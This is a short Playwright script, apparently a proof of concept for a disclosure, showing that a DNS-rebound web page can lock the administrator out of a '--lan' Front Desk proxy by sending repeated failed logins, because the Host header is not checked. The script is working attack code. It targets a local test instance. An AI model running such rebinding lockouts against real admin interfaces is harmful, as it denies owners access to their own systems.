// A remote web page locks the admin out of a --lan Front Desk by DNS
// rebinding (Host is not checked in --lan). node lockout.js PORT PWFILE
const { chromium } = require("playwright");
const fs = require("fs");
const [, , PORT, PWFILE] = process.argv;
const PW = fs.readFileSync(PWFILE, "utf8").trim();

(async () => {
  const browser = await chromium.launch({
    args: ["--host-resolver-rules=MAP rebind.test 192.0.2.2"],
  });
  const ctx = await browser.newContext();
  // Step 1: the attacker's page, now resolving to the proxy machine.
  const evil = await ctx.newPage();
  const resp = await evil.goto(`http://rebind.test:${PORT}/`);
  console.log("rebind origin loads page:", resp.status());
  const tries = await evil.evaluate(async () => {
    const out = [];
    for (let i = 0; i < 6; i++) {
      const r = await fetch("/api/login", { method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ password: "not-it-" + i }) });
      out.push(r.status);
    }
    return out;
  });
  console.log("attacker page login statuses:", JSON.stringify(tries));
  // Step 2: the admin, same browser and machine, right password.
  const admin = await ctx.newPage();
  await admin.goto(`http://192.0.2.2:${PORT}/`);
  await admin.waitForSelector("#pw");
  await admin.fill("#pw", PW);
  await admin.click("#login-form button[type=submit]");
  await admin.waitForTimeout(800);
  console.log("admin with RIGHT password sees:",
              JSON.stringify(await admin.textContent("#login-msg")));
  await admin.screenshot({ path: process.argv[4] + "/lan-lockout.png" });
  await browser.close();
})().catch((e) => { console.error("FAILED", e); process.exit(1); });
